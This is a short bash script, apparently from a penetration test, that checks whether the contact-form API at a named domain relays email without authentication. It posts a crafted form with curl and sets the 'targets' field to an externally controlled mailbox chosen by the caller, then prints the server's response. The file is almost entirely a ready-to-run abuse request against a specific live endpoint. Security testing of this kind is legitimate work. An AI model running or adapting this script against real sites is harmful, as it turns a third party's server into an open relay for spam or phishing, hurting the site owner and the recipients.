#!/bin/bash
# Independent verifier: unauthenticated email relay test against in-scope target
# OUTBOX = externally-controlled third-party mailbox (attacker chosen)
OUT="$1"
LABEL="$2"
cd /work/evidence
echo "########## $LABEL -> targets=$OUT ##########"
curl -s -D "vfy3_${LABEL}.hdr" -o "vfy3_${LABEL}.out" -m 30 --config vfy3.cfg \
  -X POST \
  -F "fname=Verifier" -F "lname=Probe" -F "areacode=973" -F "tel=5550100" \
  -F "cname=Acme Test" -F "subject=Relay verification $LABEL" \
  -F "msg=Independent verification of unauthenticated relay." \
  -F "check=0" \
  -F "targets=${OUT}" \
  https://www.infinitycapital.bh/api/send
echo "curl_exit=$?"
echo "--- response headers ---"
head -12 "vfy3_${LABEL}.hdr"
echo "--- response body ---"
head -c 500 "vfy3_${LABEL}.out"
echo ""
echo "body_bytes=$(wc -c < "vfy3_${LABEL}.out")"
